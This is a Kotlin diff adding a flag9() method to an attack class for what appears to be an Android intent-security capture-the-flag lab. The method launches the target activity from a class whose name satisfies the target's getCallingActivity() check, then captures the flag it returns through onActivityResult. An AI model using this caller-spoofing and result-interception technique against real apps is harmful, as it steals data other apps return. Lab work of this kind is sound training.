@@ -217,4 +217,25 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 		}
 		activity.startActivityForResult(intent, 8)
 	}
+
+	/**
+	 * FLAG 9 - Result Data Stealing via startActivityForResult
+	 * Technique: Caller Identity Spoofing + Result Interception
+	 * Same as Flag8 — target activity verifies caller contains "Hextree" via getCallingActivity().
+	 * Additionally, target activity sends back sensitive data (flag) via setResult(-1, intent).
+	 * setResult(-1) = RESULT_OK — target finished successfully and returns data to caller.
+	 * We capture the returned intent in onActivityResult() and display it via Utils.showDialog().
+	 * This simulates a real attack where a malicious app steals result data from another app.
+	 */
+	fun flag9() {
+		val activityPath = "$packageName.activities.Flag9Activity"
+
+		// Launch Flag9 via startActivityForResult from HextreeActivity
+		// so getCallingActivity() = "HextreeActivity" contains "Hextree"
+		// Flag9 will call setResult(-1, intent) sending flag back to onActivityResult()
+		val intent = Intent().apply {
+			setClassName(packageName, activityPath)
+		}
+		activity.startActivityForResult(intent,9)
+	}
 }
